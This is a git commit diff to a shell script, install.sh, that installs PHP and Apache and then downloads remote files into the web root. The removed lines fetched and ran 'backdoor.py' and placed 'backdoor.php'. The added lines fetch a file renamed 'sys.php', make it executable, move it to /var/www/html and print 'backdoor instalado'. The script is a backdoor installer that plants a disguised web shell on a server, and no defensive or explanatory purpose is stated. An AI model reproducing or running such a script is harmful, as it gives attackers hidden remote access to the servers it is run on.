88853c92d438d0ddfc370d7f1076be97b5c0bf63
Facundo Salgado <63315825+byteSalgado@users.noreply.github.com>
2020-08-11 10:40:10 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -5,11 +5,9 @@ apt-get install python -y
 apt-get install wget -y
 apt-get install php -y
 apt-get install apache2 -y
-wget https://download937.mediafire.com/ooodwaw7wm0g/gq3eu1315jk8sy9/backdoor.py
-chmod +x backdoor.py
-python backdoor.py
-mv backdoor.py /var/www/html
-wget https://download1080.mediafire.com/5p59etev2nyg/psd5wtck0imn1q9/backdoor.php
-chmod +x  backdoor.php
+wget https://download848.mediafire.com/u78yfqqof15g/9n2lrd7fg51gn5s/sys.php
+chmod +x  sys.php
 clear
-mv backdoor.php /var/www/html
+mv sys.php /var/www/html
+clear
+printf "\e[1;32mbackdoor instalado\n"
